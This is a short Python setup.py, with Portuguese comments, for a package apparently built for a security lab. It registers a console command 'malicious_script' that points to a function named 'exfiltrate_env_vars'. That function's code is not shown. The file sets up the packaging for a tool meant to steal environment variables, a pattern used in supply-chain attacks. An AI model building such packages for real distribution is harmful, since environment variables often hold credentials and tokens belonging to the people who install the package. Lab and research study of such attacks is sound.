# setup.py
from setuptools import setup, find_packages

setup(
    name="artifact_lab_3_package_ccd28738",  # Substitua hifens por underscores
    version="0.3.1",  # Versão atualizada
    packages=find_packages(),
    install_requires=[],
    entry_points={
        'console_scripts': [
            'malicious_script=artifact_lab_3_package_ccd28738.malicious:exfiltrate_env_vars',
        ],
    },
)

